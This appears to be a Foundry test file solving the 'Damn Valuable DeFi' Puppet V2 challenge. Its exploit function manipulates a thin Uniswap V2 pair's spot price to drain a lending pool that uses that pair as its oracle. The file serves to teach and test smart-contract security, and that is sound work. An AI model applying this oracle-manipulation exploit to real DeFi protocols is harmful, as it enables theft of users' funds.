// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {BaseTest} from "../BaseTest.sol";
import {Utilities} from "../utils/Utilities.sol";

import "forge-std/Test.sol";

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH9} from "../../src/WETH9.sol";

import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../src/puppet-v2/Interfaces.sol";

contract PuppetV2Test is BaseTest {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 public constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 public constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 public constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 public constant DEADLINE = 10_000_000;

    IUniswapV2Pair uniswapV2Pair;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;

    DamnValuableToken token;
    WETH9 weth;

    PuppetV2Pool puppetV2Pool;

    address attacker;

    constructor() {
        string[] memory labels = new string[](1);
        labels[0] = "Attacker";

        preSetup(1, ATTACKER_INITIAL_ETH_BALANCE, labels);
    }

    function setUp() public override {
        super.setUp();
        vm.label(address(this), "deployer");

        attacker = users[0];

        vm.label(attacker, "Attacker");

        // Deploy token to be traded in Uniswap
        token = new DamnValuableToken();
        vm.label(address(token), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "artifacts/build-uniswap-v2/core/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "artifacts/build-uniswap-v2/core/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            address(this), // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(address(this)), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        token.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );
    }

    function test_ExploitPuppetV2() public {
        runTest();
    }

    function exploit() internal override {
        // Manipulating bad oracle with 1 source.

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        vm.startPrank(attacker);
        token.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);

        uniswapV2Router.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            1,
            path,
            attacker,
            DEADLINE
        );
        weth.deposit{value: address(attacker).balance}();
        assertGt(weth.balanceOf(attacker), 29 ether);
        assertLt(weth.balanceOf(attacker), 30 ether);

        weth.approve(address(puppetV2Pool), type(uint256).max);

        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function success() internal override {
        assertEq(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(puppetV2Pool)), 0);
    }
}
